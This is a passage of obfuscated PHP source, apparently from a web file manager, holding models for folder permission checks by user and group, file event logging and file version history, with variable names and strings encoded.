(AuthModel::authCheckRoot($àº›İ£Ñ[$…ÃùÁøİ[416]][$…ÃùÁøİ[417]])) { $§ı®ôêÚ[] = USER_ID; } $àº›İ£Ñ[$…ÃùÁøİ[416]][$…ÃùÁøİ[2014]] = Model($…ÃùÁøİ[515])->userListInfo($§ı®ôêÚ); return $àº›İ£Ñ; } private function authFolderOwnerGroup($ÛÕ®Çµ) { $—ÏÓ˜‰¼ =& $_SERVER[Æ š¦İÈ]; $¥Úñã = Model($—ÏÓ˜‰¼[1901])->where(array($—ÏÓ˜‰¼[1812] => $ÛÕ®Çµ))->select(); $á‚« Ù¦ = array(); if (!$¥Úñã) { return $á‚« Ù¦; } foreach ($¥Úñã as $Ìœ‘÷) { $˜ç¬Ë¯ş = $this->authInfo($Ìœ‘÷); if (AuthModel::authCheckRoot($˜ç¬Ë¯ş[$—ÏÓ˜‰¼[416]])) { $á‚« Ù¦[] = $Ìœ‘÷[$—ÏÓ˜‰¼[1644]]; } } return $á‚« Ù¦; } private function authFolderOwnerUser($±İ°ëÏö) { $ï†ªã˜ì =& $_SERVER[Æ š¦İÈ]; $š”ó”¿ = array(); $ßÊ—ÁÎ¼ = !1; foreach ($±İ°ëÏö as $˜»Ã±•“) { $ª„‡ˆ¿ = $this->authInfo($˜»Ã±•“); if ($˜»Ã±•“[$ï†ªã˜ì[506]] == $ï†ªã˜ì[192]) { $ßÊ—ÁÎ¼ = !0; } if ($˜»Ã±•“[$ï†ªã˜ì[414]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ª„‡ˆ¿[$ï†ªã˜ì[416]])) { $š”ó”¿[] = $˜»Ã±•“[$ï†ªã˜ì[506]]; } } } return array($ï†ªã˜ì[596] => $š”ó”¿, $ï†ªã˜ì[2013] => $ßÊ—ÁÎ¼); } public function authMake($÷¹×÷æ, $ŸÏáŒ‰Ç = false) { $îÎëäî¬ =& $_SERVER[Æ š¦İÈ]; $‚ß¹Ú× = $this->authArrayCheck($÷¹×÷æ, $ŸÏáŒ‰Ç); if ($‚ß¹Ú×[$îÎëäî¬[2015]]) { $‚ß¹Ú×[$îÎëäî¬[2015]] = $this->sourceAuthInfo($‚ß¹Ú×[$îÎëäî¬[2015]]); } return $‚ß¹Ú×; } public function authArrayCheck($ñÕ¥ÃÄ, $¹ıòõèÌ = false) { $¨ñÓß”± =& $_SERVER[Æ š¦İÈ]; if (!$ñÕ¥ÃÄ) { return array($¨ñÓß”±[417] => 0, $¨ñÓß”±[468] => !1); } $¹ıòõèÌ = $¹ıòõèÌ ? $¹ıòõèÌ : USER_ID; $ß±ñøÔ‚ = 0; $Åó­¸“¹ = 0; $ùŠ©‘åÈ = 0; $ÒÈÑˆÏÑ = 0; $´ãäõ›ı = 0; $ïûúÎƒ = 0; $ßï¯ÛÎ = 1000; $…òå½‘² = 0; $§óùÌş¶ = 0; $”°îÁß¥ = 0; $¤»ÂäíÕ = 0; $ÌİëéŸí = array($¨ñÓß”±[405] => 0); foreach ($ñÕ¥ÃÄ as $ÌİëéŸí) { $äÂÎò®° = $this->authInfo($ÌİëéŸí); if (!$äÂÎò®°) { continue; } $½Ó­Á‡ = $ÌİëéŸí[$¨ñÓß”±[506]]; $úï¢ñ‹î = intval($äÂÎò®°[$¨ñÓß”±[416]]); if ($ÌİëéŸí[$¨ñÓß”±[414]] == SourceModel::TYPE_USER && $½Ó­Á‡ == $¹ıòõèÌ) { $ß±ñøÔ‚ = !0; $ùŠ©‘åÈ = $äÂÎò®°; $Åó­¸“¹ = $úï¢ñ‹î; } else { if ($ÌİëéŸí[$¨ñÓß”±[414]] == SourceModel::TYPE_GROUP && $this->groupContainUser($½Ó­Á‡, $¹ıòõèÌ)) { $ÒÈÑˆÏÑ = !0; $’º¾¾ˆÑ = $this->groupStepToUserGroup($½Ó­Á‡, $¹ıòõèÌ); if ($’º¾¾ˆÑ < $ßï¯ÛÎ) { $ßï¯ÛÎ = $’º¾¾ˆÑ; $´ãäõ›ı = $úï¢ñ‹î; $ïûúÎƒ = $äÂÎò®°; $…òå½‘² = $½Ó­Á‡; } if ($’º¾¾ˆÑ == $ßï¯ÛÎ && $úï¢ñ‹î >= $´ãäõ›ı) { $´ãäõ›ı = $úï¢ñ‹î; $ïûúÎƒ = $äÂÎò®°; $…òå½‘² = $½Ó­Á‡; } } else { if ($½Ó­Á‡ == $¨ñÓß”±[192]) { $§óùÌş¶ = !0; $¤»ÂäíÕ = $äÂÎò®°; $”°îÁß¥ = $úï¢ñ‹î; } } } } if ($ß±ñøÔ‚) { $ü±Îùû‡ = $Åó­¸“¹; $äÂÎò®° = $ùŠ©‘åÈ; $ì‡Ûå‹ = LNG($¨ñÓß”±[2016]); } else { if ($ÒÈÑˆÏÑ) { $ü±Îùû‡ = $´ãäõ›ı; $äÂÎò®° = $ïûúÎƒ; $ôîÎÁøÂ = Model($¨ñÓß”±[524])->getInfo($…òå½‘²); $ì‡Ûå‹ = $¨ñÓß”±[161] . $ôîÎÁøÂ[$¨ñÓß”±[528]] . $¨ñÓß”±[2017] . LNG($¨ñÓß”±[2018]); } else { if ($§óùÌş¶) { $ü±Îùû‡ = $”°îÁß¥; $äÂÎò®° = $¤»ÂäíÕ; $ì‡Ûå‹ = LNG($¨ñÓß”±[1989]); } else { $ü±Îùû‡ = 0; $äÂÎò®° = !1; $ì‡Ûå‹ = $¨ñÓß”±[12]; } } } $¿€ó³©û = array($¨ñÓß”±[2008] => intval($ü±Îùû‡), $¨ñÓß”±[1992] => $äÂÎò®°, $¨ñÓß”±[2009] => $ì‡Ûå‹, $¨ñÓß”±[2001] => $ÌİëéŸí[$¨ñÓß”±[405]]); return $¿€ó³©û; } private function groupContainUser($ßˆâ•ˆ, $Ú‹œÏ¯İ = false) { return in_array($ßˆâ•ˆ, $this->userGroupParents($Ú‹œÏ¯İ)); } private function groupStepToUserGroup($áï“—üœ, $ÆÌã¶ô» = false) { $³ÚØÔì‹ =& $_SERVER[Æ š¦İÈ]; $£Î­–ï™ = $this->userGroupList($ÆÌã¶ô»); $ Ù˜°§š = 1000; $Á¾¤’ˆÊ = $GLOBALS[$³ÚØÔì‹[6]][$³ÚØÔì‹[90]][$³ÚØÔì‹[1912]] == 1; $øšååøÖ = $Á¾¤’ˆÊ ? 3 : 2; foreach ($£Î­–ï™ as $äìéØµ™) { if ($äìéØµ™[$³ÚØÔì‹[1812]] == $áï“—üœ) { return 0; } $ÃÈ”à–İ = explode($³ÚØÔì‹[50], trim($äìéØµ™[$³ÚØÔì‹[523]], $³ÚØÔì‹[50])); if ($ÃÈ”à–İ[0] == $³ÚØÔì‹[192] && count($ÃÈ”à–İ) > $øšååøÖ) { $®´ËÊê« = array_reverse(array_slice($ÃÈ”à–İ, $øšååøÖ)); $şßıëş = array_search($áï“—üœ, $®´ËÊê«); if ($şßıëş !== !1 && $şßıëş + 1 <= $ Ù˜°§š) { $ Ù˜°§š = $şßıëş + 1; } } } return $ Ù˜°§š; } private function userGroupList($È««¯Öª = false) { $ğ—ØüÇÜ =& $_SERVER[Æ š¦İÈ]; static $ä”½İìß = array(); if (isset($ä”½İìß[$È««¯Öª])) { return $ä”½İìß[$È««¯Öª]; } $‡îöªö = Model($ğ—ØüÇÜ[540])->getInfo($È««¯Öª); $ä”½İìß[$È««¯Öª] = array_to_keyvalue($‡îöªö[$ğ—ØüÇÜ[1990]], $ğ—ØüÇÜ[1812]); return $ä”½İìß[$È««¯Öª]; } public function userGroupParents($œ¾ˆœ€ ) { $‘î÷ŠÄó =& $_SERVER[Æ š¦İÈ]; static $¥¾¡±˜ƒ = array(); $œ¾ˆœ€  = $œ¾ˆœ€  ? $œ¾ˆœ€  : USER_ID; if (isset($¥¾¡±˜ƒ[$œ¾ˆœ€ ])) { return $¥¾¡±˜ƒ[$œ¾ˆœ€ ]; } $™øò·Ş» = $this->userGroupList($œ¾ˆœ€ ); $ğå–ì³ = array(); $«ßä±ÜĞ = $GLOBALS[$‘î÷ŠÄó[6]][$‘î÷ŠÄó[90]][$‘î÷ŠÄó[1912]] == 1; $¡Å©¿á = $«ßä±ÜĞ ? 3 : 2; foreach ($™øò·Ş» as $‚¸Ô¶ğ) { $âÃÇ·İÅ = array($‚¸Ô¶ğ[$‘î÷ŠÄó[1812]]); $Œ¶™å÷² = explode($‘î÷ŠÄó[50], trim($‚¸Ô¶ğ[$‘î÷ŠÄó[523]], $‘î÷ŠÄó[50])); if ($Œ¶™å÷²[0] == $‘î÷ŠÄó[192] && count($Œ¶™å÷²) > $¡Å©¿á) { $˜şÜÊÙ‡ = array_slice($Œ¶™å÷², $¡Å©¿á); $âÃÇ·İÅ = array_merge($âÃÇ·İÅ, array_reverse($˜şÜÊÙ‡)); } $ğå–ì³ = array_merge($ğå–ì³, $âÃÇ·İÅ); } $¥¾¡±˜ƒ[$œ¾ˆœ€ ] = array_unique($ğå–ì³); return $¥¾¡±˜ƒ[$œ¾ˆœ€ ]; } public function authTargetInfoMake($ò ¬¡§ƒ) { $«úıåÜÇ =& $_SERVER[Æ š¦İÈ]; $ı›Ç˜„Å = array(); $Ó‘Òá¾” = array(); foreach ($ò ¬¡§ƒ as $‰áÎú) { if ($‰áÎú[$«úıåÜÇ[414]] == SourceModel::TYPE_USER) { $ı›Ç˜„Å[] = intval($‰áÎú[$«úıåÜÇ[506]]); } else { if ($‰áÎú[$«úıåÜÇ[414]] == SourceModel::TYPE_GROUP) { $Ó‘Òá¾”[] = intval($‰áÎú[$«úıåÜÇ[506]]); } } } if ($ı›Ç˜„Å) { $ı›Ç˜„Å = Model($«úıåÜÇ[515])->userListInfo($ı›Ç˜„Å); } if ($Ó‘Òá¾”) { $ºè…Å³ú = array($«úıåÜÇ[1899] => array($«úıåÜÇ[421], $Ó‘Òá¾”)); $Ó‘Òá¾” = Model($«úıåÜÇ[524])->field($«úıåÜÇ[2019])->where($ºè…Å³ú)->select(); $Ó‘Òá¾” = array_to_keyvalue($Ó‘Òá¾”, $«úıåÜÇ[1812]); } return array($«úıåÜÇ[2020] => $ı›Ç˜„Å, $«úıåÜÇ[2021] => $Ó‘Òá¾”); } public function authInfo($Ø³½æõ) { $·³ËÈ î =& $_SERVER[Æ š¦İÈ]; if ($Ø³½æõ[$·³ËÈ î[1913]]) { $¿¿¨Ÿ×ô = Model($·³ËÈ î[509])->listData($Ø³½æõ[$·³ËÈ î[1913]]); if (!$¿¿¨Ÿ×ô) { return !1; $ùóá›“Õ = Model($·³ËÈ î[509])->listData(); $ø¯ë³Ó½ = array_filter_by_field($ùóá›“Õ, $·³ËÈ î[416], $·³ËÈ î[192]); return $ø¯ë³Ó½; } $ãÌ±€¹Œ = array_field_key($¿¿¨Ÿ×ô, array($·³ËÈ î[403], $·³ËÈ î[32], $·³ËÈ î[416], $·³ËÈ î[1834], $·³ËÈ î[1835])); $ãÌ±€¹Œ[$·³ËÈ î[2022]] = $Ø³½æõ; return $ãÌ±€¹Œ; } else { return array($·³ËÈ î[422] => 0, $·³ËÈ î[1818] => $Ø³½æõ[$·³ËÈ î[1967]], $·³ËÈ î[423] => $·³ËÈ î[12], $·³ËÈ î[1834] => $·³ËÈ î[2023]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\x63\145\137\145\x76\145\156\x74"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\124\151\x6d\x65", "\x74\151\x6d\x65", "\151\156\x73\145\162\x74", "\x66\165\156\x63\164\151\x6f\x6e"), array("\x64\145\163\x63", '', "\151\156\x73\145\x72\164\x2c\165\x70\144\141\x74\x65\54\x73\x65\154\145\x63\x74", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ö…¯¨, $Àœ½À³…, $â™û = '') { $‹Õ‚ˆÜ½ =& $_SERVER[Æ š¦İÈ]; if (!$this->eventSave) { return; } $°„ıŸŞ = Model($‹Õ‚ˆÜ½[1316])->sourceInfo($Ö…¯¨); if (!$°„ıŸŞ) { return !1; } if ($this->isCacheEvent($°„ıŸŞ, $Àœ½À³…)) { return; } if ($â™û && is_string($â™û)) { $â™û = array($‹Õ‚ˆÜ½[1850] => $â™û); } $È£¬À® = array($‹Õ‚ˆÜ½[420] => $Ö…¯¨, $‹Õ‚ˆÜ½[2024] => $°„ıŸŞ[$‹Õ‚ˆÜ½[500]], $‹Õ‚ˆÜ½[2025] => $°„ıŸŞ[$‹Õ‚ˆÜ½[32]], $‹Õ‚ˆÜ½[521] => !empty($°„ıŸŞ[$‹Õ‚ˆÜ½[521]]) ? $°„ıŸŞ[$‹Õ‚ˆÜ½[521]] : $‹Õ‚ˆÜ½[12], $‹Õ‚ˆÜ½[1635] => USER_ID, $‹Õ‚ˆÜ½[425] => $Àœ½À³…, $‹Õ‚ˆÜ½[1637] => $â™û); $this->addSystemLog($Àœ½À³…, $È£¬À®); unset($È£¬À®[$‹Õ‚ˆÜ½[2025]], $È£¬À®[$‹Õ‚ˆÜ½[521]]); return $this->add($È£¬À®); } private function addSystemLog($àîî Ô, $øĞâÖŸ£) { $“Ú§‚­ =& $_SERVER[Æ š¦İÈ]; if ($àîî Ô == $“Ú§‚­[2026]) { $àîî Ô = $øĞâÖŸ£[$“Ú§‚­[453]][$“Ú§‚­[2027]]; } else { if (in_array($àîî Ô, array($“Ú§‚­[1792], $“Ú§‚­[2028]))) { $àîî Ô = $øĞâÖŸ£[$“Ú§‚­[453]][$“Ú§‚­[752]]; } } $ç°È³öÌ = array_merge($øĞâÖŸ£, array($“Ú§‚­[2029] => $øĞâÖŸ£[$“Ú§‚­[405]], $“Ú§‚­[2030] => $øĞâÖŸ£[$“Ú§‚­[2030]])); Hook::trigger($“Ú§‚­[2031], $“Ú§‚­[2032] . $àîî Ô, $øĞâÖŸ£); Model($“Ú§‚­[1756])->addLog($“Ú§‚­[2032] . $àîî Ô, $ç°È³öÌ); } private function isCacheEvent($ù§ã…£ƒ, $‹íÌº½¼) { if ($ù§ã…£ƒ[$_SERVER[Æ š¦İÈ][414]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ßâéùÃ¾, $Ÿ’ŠàçÓ) { $ê½ıÜş =& $_SERVER[Æ š¦İÈ]; $„¬—åÛÜ = Model($ê½ıÜş[1316])->sourceInfo($ßâéùÃ¾); $¸†Ë¬” = array($ê½ıÜş[2027] => $Ÿ’ŠàçÓ, $ê½ıÜş[32] => $„¬—åÛÜ[$ê½ıÜş[32]]); return $this->addEvent($ßâéùÃ¾, $ê½ıÜş[2026], $¸†Ë¬”); } public function eventFileEdit($ÛÊˆŠïÖ) { $ŸÙ€†€ =& $_SERVER[Æ š¦İÈ]; $„¨ôÎõı = array($ŸÙ€†€[2033] => $_SERVER[$ŸÙ€†€[2034]], $ŸÙ€†€[2035] => strtolower(ACTION)); return $this->addEvent($ÛÊˆŠïÖ, $ŸÙ€†€[1782], $„¨ôÎõı); } public function eventRecycle($’—Ê€â¦, $ÌÊÓ™áô) { return $this->addEvent($’—Ê€â¦, $_SERVER[Æ š¦İÈ][2028], $ÌÊÓ™áô); } public function eventRemove($•¤êÈ·”) { $ÉÖ¾Èòù =& $_SERVER[Æ š¦İÈ]; $Ç¯ûúúÜ = Model($ÉÖ¾Èòù[1316])->sourceInfo($•¤êÈ·”); $Ÿ¥»ì¿Í = $Ç¯ûúúÜ[$ÉÖ¾Èòù[32]]; return $this->addEvent($Ç¯ûúúÜ[$ÉÖ¾Èòù[500]], $ÉÖ¾Èòù[1781], $Ÿ¥»ì¿Í); } public function eventShare($†¡€ÄŠÌ, $µæ›ËŸ) { return $this->addEvent($†¡€ÄŠÌ, $_SERVER[Æ š¦İÈ][1792], $µæ›ËŸ); } public function eventMove($²İ•ó·, $£µ¯, $ïÇ„ÀÁñ) { $…â–á´È =& $_SERVER[Æ š¦İÈ]; $ˆ­ÏÁÆÊ = Model($…â–á´È[1316]); $èÌ£Ã¬ = $ˆ­ÏÁÆÊ->sourceInfo($²İ•ó·); $ÜããËˆà = $ˆ­ÏÁÆÊ->sourceInfo($£µ¯); $ü÷’Ø€ = $ˆ­ÏÁÆÊ->sourceInfo($ïÇ„ÀÁñ); $É±¶˜ˆô = array($…â–á´È[1149] => $£µ¯, $…â–á´È[2036] => $ÜããËˆà[$…â–á´È[32]], $…â–á´È[2015] => !empty($ÜããËˆà[$…â–á´È[521]]) ? $ÜããËˆà[$…â–á´È[521]] : $…â–á´È[12], $…â–á´È[1150] => $ïÇ„ÀÁñ, $…â–á´È[2037] => $ü÷’Ø€[$…â–á´È[32]], $…â–á´È[2038] => !empty($ü÷’Ø€[$…â–á´È[521]]) ? $ü÷’Ø€[$…â–á´È[521]] : $…â–á´È[12]); $this->addEvent($²İ•ó·, $…â–á´È[553], $É±¶˜ˆô); $èÌ£Ã¬ = $ˆ­ÏÁÆÊ->sourceInfo($²İ•ó·); $É±¶˜ˆô = array($…â–á´È[405] => $èÌ£Ã¬[$…â–á´È[405]], $…â–á´È[32] => $èÌ£Ã¬[$…â–á´È[32]]); $this->addEvent($£µ¯, $…â–á´È[2039], $É±¶˜ˆô); } public function eventCopy($¶¡ºİÍ) { $this->eventCreate($¶¡ºİÍ, $_SERVER[Æ š¦İÈ][551]); } public function eventRename($Ë°›¸˜, $Ï¨§©”ö, $Óª¢¤Ä¼) { $…•ÅÒ¬ï =& $_SERVER[Æ š¦İÈ]; $ë…—ÚÍ = array($…•ÅÒ¬ï[1149] => $Ï¨§©”ö, $…•ÅÒ¬ï[1150] => $Óª¢¤Ä¼); return $this->addEvent($Ë°›¸˜, $…•ÅÒ¬ï[1331], $ë…—ÚÍ); } public function eventAddComment($¦‰Ñ÷Ş÷, $ˆÎÊïàÌ) { return $this->addEvent($¦‰Ñ÷Ş÷, $_SERVER[Æ š¦İÈ][2040], $ˆÎÊïàÌ); } public function eventAddDesc($ûéêŒÔŒ, $û«ÔæÛœ) { return $this->addEvent($ûéêŒÔŒ, $_SERVER[Æ š¦İÈ][2041], $û«ÔæÛœ); } public function listBySource($»®ÎÍ‘½) { $üĞÀµò =& $_SERVER[Æ š¦İÈ]; $ÀÃ‚şè² = Model($üĞÀµò[1316])->sourceInfo($»®ÎÍ‘½); $Œ°–Ú“ = array($üĞÀµò[420] => $»®ÎÍ‘½); if ($ÀÃ‚şè²[$üĞÀµò[413]] == $üĞÀµò[89]) { $©ü‰Ê’¨ = Model($üĞÀµò[1316])->listSearchChildren($»®ÎÍ‘½, 20000); $©ü‰Ê’¨[] = $»®ÎÍ‘½ . $üĞÀµò[375]; $Œ°–Ú“ = array($üĞÀµò[405] => array($üĞÀµò[7], $©ü‰Ê’¨)); } $Òãƒ­š = $this->where($Œ°–Ú“)->order($üĞÀµò[2042])->selectPage(); if ($Òãƒ­š[$üĞÀµò[363]][$üĞÀµò[364]] == 0) { $Òãƒ­š[$üĞÀµò[363]][$üĞÀµò[364]] = 1; $Òãƒ­š[$üĞÀµò[366]] = array(array($üĞÀµò[420] => $»®ÎÍ‘½, $üĞÀµò[2024] => $ÀÃ‚şè²[$üĞÀµò[500]], $üĞÀµò[1635] => $ÀÃ‚şè²[$üĞÀµò[454]], $üĞÀµò[425] => $üĞÀµò[2043], $üĞÀµò[426] => $ÀÃ‚şè²[$üĞÀµò[195]], $üĞÀµò[1637] => $üĞÀµò[12])); } return $this->eventListParse($Òãƒ­š, $»®ÎÍ‘½); } private function eventListParse($Úù©’²ï, $º¢Åë³Ô) { $¿ü†¨÷š =& $_SERVER[Æ š¦İÈ]; $Ìæ¢§Ê© = $Úù©’²ï[$¿ü†¨÷š[366]]; $Æïøƒ‚ö = array_to_keyvalue($Ìæ¢§Ê©, $¿ü†¨÷š[12], $¿ü†¨÷š[405]); $şËÉ¾ªƒ = array_to_keyvalue($Ìæ¢§Ê©, $¿ü†¨÷š[12], $¿ü†¨÷š[2030]); foreach ($Ìæ¢§Ê© as $Üâ³„º) { $˜Ê©éÌî = $Üâ³„º[$¿ü†¨÷š[453]]; if ($Üâ³„º[$¿ü†¨÷š[33]] == $¿ü†¨÷š[553] && isset($˜Ê©éÌî[$¿ü†¨÷š[1149]])) { $Æïøƒ‚ö[] = $˜Ê©éÌî[$¿ü†¨÷š[1149]] . $¿ü†¨÷š[12]; $Æïøƒ‚ö[] = $˜Ê©éÌî[$¿ü†¨÷š[1150]] . $¿ü†¨÷š[12]; } if ($Üâ³„º[$¿ü†¨÷š[33]] == $¿ü†¨÷š[2039] && isset($˜Ê©éÌî[$¿ü†¨÷š[405]])) { $Æïøƒ‚ö[] = $˜Ê©éÌî[$¿ü†¨÷š[405]] . $¿ü†¨÷š[12]; } } $Æïøƒ‚ö = array_merge($Æïøƒ‚ö, $şËÉ¾ªƒ, array($º¢Åë³Ô . $¿ü†¨÷š[12])); $Æïøƒ‚ö = array_unique($Æïøƒ‚ö); $Ã¿Ø¸Ç÷ = array_unique(array_to_keyvalue($Ìæ¢§Ê©, $¿ü†¨÷š[12], $¿ü†¨÷š[1644])); $•Æ–Œ„¸ = Model($¿ü†¨÷š[540])->userListInfo($Ã¿Ø¸Ç÷); $¤¦“”  = Model($¿ü†¨÷š[822])->sourceListInfo($Æïøƒ‚ö, !0); foreach ($Ìæ¢§Ê© as &$Üâ³„º) { if ($Üâ³„º[$¿ü†¨÷š[33]] == $¿ü†¨÷š[553] && isset($Üâ³„º[$¿ü†¨÷š[453]][$¿ü†¨÷š[1149]])) { $Üâ³„º[$¿ü†¨÷š[453]][$¿ü†¨÷š[1149]] = $¤¦“” [$Üâ³„º[$¿ü†¨÷š[453]][$¿ü†¨÷š[1149]]]; $Üâ³„º[$¿ü†¨÷š[453]][$¿ü†¨÷š[1150]] = $¤¦“” [$Üâ³„º[$¿ü†¨÷š[453]][$¿ü†¨÷š[1150]]]; } if ($Üâ³„º[$¿ü†¨÷š[33]] == $¿ü†¨÷š[2039] && isset($Üâ³„º[$¿ü†¨÷š[453]][$¿ü†¨÷š[405]])) { $Üâ³„º[$¿ü†¨÷š[453]][$¿ü†¨÷š[405]] = $¤¦“” [$Üâ³„º[$¿ü†¨÷š[453]][$¿ü†¨÷š[405]]]; } $Üâ³„º[$¿ü†¨÷š[87]] = $¤¦“” [$Üâ³„º[$¿ü†¨÷š[405]]]; $Üâ³„º[$¿ü†¨÷š[2044]] = $¤¦“” [$Üâ³„º[$¿ü†¨÷š[2030]]]; if ($Üâ³„º[$¿ü†¨÷š[33]] == $¿ü†¨÷š[1781]) { $Üâ³„º[$¿ü†¨÷š[2044]] = $Üâ³„º[$¿ü†¨÷š[87]]; $Üâ³„º[$¿ü†¨÷š[2030]] = $Üâ³„º[$¿ü†¨÷š[2044]][$¿ü†¨÷š[405]]; $Üâ³„º[$¿ü†¨÷š[87]] = !1; $Üâ³„º[$¿ü†¨÷š[405]] = $¿ü†¨÷š[12]; } $Üâ³„º[$¿ü†¨÷š[1975]] = $•Æ–Œ„¸[$Üâ³„º[$¿ü†¨÷š[1644]]]; } unset($Üâ³„º); $Úù©’²ï[$¿ü†¨÷š[366]] = $Ìæ¢§Ê©; return $Úù©’²ï; } public function removeBySource($ô…–ı¢Ï) { $ŒÛÛ³Ê‰ = array($_SERVER[Æ š¦İÈ][420] => $ô…–ı¢Ï); $this->where($ŒÛÛ³Ê‰)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\x72\x63\x65\x5f\150\151\163\164\157\162\x79"; public function historyCount($ÇÆŒ–‰ï) { $»—æà‘Ã =& $_SERVER[Æ š¦İÈ]; if (!$ÇÆŒ–‰ï) { return array(); } if (is_string($ÇÆŒ–‰ï) || is_int($ÇÆŒ–‰ï)) { $ÇÆŒ–‰ï = array($ÇÆŒ–‰ï); } $š¹²—ƒ¸ = array($»—æà‘Ã[405], $»—æà‘Ã[1844] => $»—æà‘Ã[502]); $¾Æ„÷ş = array($»—æà‘Ã[405] => array($»—æà‘Ã[7], $ÇÆŒ–‰ï)); $âğâş®ü = $this->field($š¹²—ƒ¸)->where($¾Æ„÷ş)->group($»—æà‘Ã[405])->select(); return array_to_keyvalue($âğâş®ü, $»—æà‘Ã[405], $»—æà‘Ã[502]); } public function addHistory($À×ç°şë, $ø¾Çş± = '') { $í•ş§¨ñ =& $_SERVER[Æ š¦İÈ]; $äÛ¼Ş´ = array($í•ş§¨ñ[420] => $À×ç°şë[$í•ş§¨ñ[405]], $í•ş§¨ñ[1635] => isset($À×ç°şë[$í•ş§¨ñ[456]]) ? $À×ç°şë[$í•ş§¨ñ[456]] : $À×ç°şë[$í•ş§¨ñ[454]], $í•ş§¨ñ[470] => $À×ç°şë[$í•ş§¨ñ[469]], $í•ş§¨ñ[581] => $À×ç°şë[$í•ş§¨ñ[80]], $í•ş§¨ñ[2045] => $ø¾Çş±); $Öççµ‘Ï = $GLOBALS[$í•ş§¨ñ[6]][$í•ş§¨ñ[90]][$í•ş§¨ñ[1198]]; if ($Öççµ‘Ï > 1) { $this->historyAutoClear($äÛ¼Ş´[$í•ş§¨ñ[405]]); $this->add($äÛ¼Ş´); } Hook::trigger($í•ş§¨ñ[2046], $äÛ¼Ş´); Model($í•ş§¨ñ[2047])->eventFileEdit($À×ç°şë[$í•ş§¨ñ[405]]); } private function historyAutoClear($’œØÖôà) { $‘ã§ó™› =& $_SERVER[Æ š¦İÈ]; $ˆƒØÏ = Model($‘ã§ó™›[767])->get($‘ã§ó™›[1220]); $‹„Õ­¹ô = $GLOBALS[$‘ã§ó™›[6]][$‘ã§ó™›[90]][$‘ã§ó™›[1198]]; $Ä€·¨ƒÜ = $ˆƒØÏ == $‘ã§ó™›[1221] ? 5 : $‹„Õ­¹ô; if ($‹„Õ­¹ô <= 1) { $Ä€·¨ƒÜ = 1; } if ($Ä€·¨ƒÜ >= 500) { return; } $µåóÊÚ = array($‘ã§ó™›[420] => $’œØÖôà); $ø÷ÆÅå = $this->field($‘ã§ó™›[2048])->where($µåóÊÚ)->order($‘ã§ó™›[2042])->select(); if (!$ø÷ÆÅå || $Ä€·¨ƒÜ >= count($ø÷ÆÅå)) { return; } $¯“Ï²’Ã = array_to_keyvalue($ø÷ÆÅå, $‘ã§ó™›[12], $‘ã§ó™›[403]); $¯“Ï²’Ã = array_slice($¯“Ï²’Ã, $Ä€·¨ƒÜ); $«§’ñ„÷ = array_to_keyvalue($ø÷ÆÅå, $‘ã§ó™›[12], $‘ã§ó™›[469]); $«§’ñ„÷ = array_slice($«§’ñ„÷, $Ä€·¨ƒÜ); if (!$¯“Ï²’Ã || !$«§’ñ„÷) { return; } $µåóÊÚ = array($‘ã§ó™›[422] => array($‘ã§ó™›[7], $¯“Ï²’Ã)); $this->where($µåóÊÚ)->delete(); Model($‘ã§ó™›[472])->remove($«§’ñ„÷); } public function listData($°”ì»—„) { $…­Ö ¶œ =& $_SERVER[Æ š¦İÈ]; $À¶Ù¨¸ = array($…­Ö ¶œ[420] => $°”ì»—„); $ºïş¯ë˜ = $…­Ö ¶œ[2049]; $Ëø•ï®ß = $this->field($ºïş¯ë˜)->where($À¶Ù¨¸)->order($…­Ö ¶œ[2042])->selectPage(); $this->_listAppendUser($Ëø•ï®ß[$…­Ö ¶œ[366]]); $×®ã¶¼ = Model($…­Ö ¶œ[767])->get($…­Ö ¶œ[1220]); $äôß¤Šé = 5; if ($×®ã¶¼ == $…­Ö ¶œ[1221]) { $Ëø•ï®ß[$…­Ö ¶œ[366]] = array_slice($Ëø•ï®ß[$…­Ö ¶œ[366]], 0, $äôß¤Šé); $Ëø•ï®ß[$…­Ö ¶œ[363]] = array($…­Ö ¶œ[2050] => 1, $…­Ö ¶œ[2051] => 20, $…­Ö ¶œ[2052] => 1, $…­Ö ¶œ[2053] => count($Ëø•ï®ß[$…­Ö ¶œ[366]])); } return $Ëø•ï®ß; } protected function _listAppendUser(&$Šíç¯‰ø) { $æ½„ˆÀÏ =& $_SERVER[Æ š¦İÈ]; $¦¯¸œÓĞ = array_to_keyvalue($Šíç¯‰ø, $æ½„ˆÀÏ[12], $æ½„ˆÀÏ[1644]); $¸öúØÉ½ = Model($æ½„ˆÀÏ[540])->userListInfo($¦¯¸œÓĞ); foreach ($Šíç¯‰ø as &$§ü°Û¦) { $ãÅ‡ˆ½ = $§ü°Û¦[$æ½„ˆÀÏ[1644]]; $§ü°Û¦[$æ½„ˆÀÏ[454]] = $¸öúØÉ½[$ãÅ‡ˆ½] ? $¸öúØÉ½[$ãÅ‡ˆ½] : !1; } unset($§ü°Û¦); } public function fileInfo($Æš­Ğ‹) { $ºĞ„¸œĞ =& $_SERVER[Æ š¦İÈ]; $ãøª±è£ = $this->tablePrefix; $å¹®õ§ = "{$ãøª±è£}\151\x6f\137\x66\x69\154\145\40\146\x69\154\x65\163\40\157\x6e\40\x66\x69\x6c\145\x73\56\x66\x69\x6c\145\111\x44\40\75\x20\150\x69\x73\164\157\x72\x79\56\146\x69\x6c\x65\111\x44"; return $this->alias($ºĞ„¸œĞ[2054])->where(array($ºĞ„¸œĞ[422] => $Æš­Ğ‹))->join($å¹®õ§, $ºĞ„¸œĞ[2055])->find(); } public function removeItem($Ê§ëÇØã) { $³²—•€µ =& $_SERVER[Æ š¦İÈ]; $½ÁÜµ­ = array($³²—•€µ[422] => $Ê§ëÇØã); $¤Ô‹’Â = $this->where($½ÁÜµ­)->find(); if ($¤Ô‹’Â) { $ï©‡Õ¨« = $this->where($½ÁÜµ­)->delete(); Model($³²—•€µ[472])->remove($¤Ô‹’Â[$³²—•€µ[469]]); return $ï©‡Õ¨«; } return !1; } public function removeBySource($ŞÁ•ìİ¤) { $è‘ü÷µ´ =& $_SERVER[Æ š¦İÈ]; if (!$ŞÁ•ìİ¤) { return !1; } if 